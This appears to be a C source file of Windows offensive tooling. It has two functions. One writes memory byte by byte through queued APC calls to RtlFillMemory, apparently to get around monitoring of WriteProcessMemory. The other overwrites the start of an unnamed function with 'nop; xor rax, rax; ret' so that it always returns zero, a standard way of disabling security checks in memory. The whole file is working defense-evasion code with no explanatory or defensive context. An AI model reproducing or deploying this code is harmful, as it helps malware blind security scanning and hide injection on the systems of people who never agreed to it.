#include <windows.h>
#include <stdio.h>

#include "Ntdll.h"

#pragma comment(lib, "Ntdll.lib")

BOOL WriteProcessMemoryAPC(
	_In_	HANDLE	hProcess, 
	_In_	PBYTE	pAddress, 
	_In_	PBYTE	pData, 
	_In_	DWORD	dwLength
)
{
	HANDLE hThread = NULL;
	void* pRtlFillMemory = (void*)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "RtlFillMemory");

	if (pRtlFillMemory == NULL)
	{
		return FALSE;
	}

	if (NtCreateThreadEx(&hThread, 0x001FFFFF, NULL, hProcess, (LPVOID)ExitThread, (LPVOID)0, 1, NULL, 0, 0, NULL) != 0)
	{
		return FALSE;
	}

	for (DWORD i = 0; i < dwLength; i++)
	{
		if (NtQueueApcThread(hThread, pRtlFillMemory, (void*)((BYTE*)pAddress + i), (void*)1, (void*)*(BYTE*)(pData + i)) != 0)
		{
			TerminateThread(hThread, 0);
			CloseHandle(hThread);
			return FALSE;
		}
	}
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	return TRUE;
}

BOOL PatchFunction(
	_In_	PVOID	pFunctionAddr,
	_In_	BOOL	needRwx
)
{
	DWORD	dwOldProtect = 0;
	DWORD	dwMemProtect = PAGE_READWRITE;
	BYTE	patch[] = { 
		0x90,				// nop
		0x48, 0x31, 0xC0,	// xor rax, rax
		0xC3				// ret
	}; 

	if (needRwx)
		dwMemProtect = PAGE_EXECUTE_READWRITE;


	if (!
		VirtualProtect(pFunctionAddr, 0x1000, dwMemProtect, &dwOldProtect)
		)
	{
		printf("[!] Error on VirtualProtect ! Error : %d\n", GetLastError());
		return FALSE;
	}

	if (!
		WriteProcessMemoryAPC(GetCurrentProcess(), pFunctionAddr, &patch, sizeof(patch))
		)
	{
		printf("[!] Error on WriteProcessMemoryAPC !\n");
		return FALSE;
	}

	if (!
		VirtualProtect(pFunctionAddr, 0x1000, dwOldProtect, &dwOldProtect)
		)
	{
		printf("[!] Error on VirtualProtect ! Error : %d\n", GetLastError());
		return FALSE;
	}


	return TRUE;
}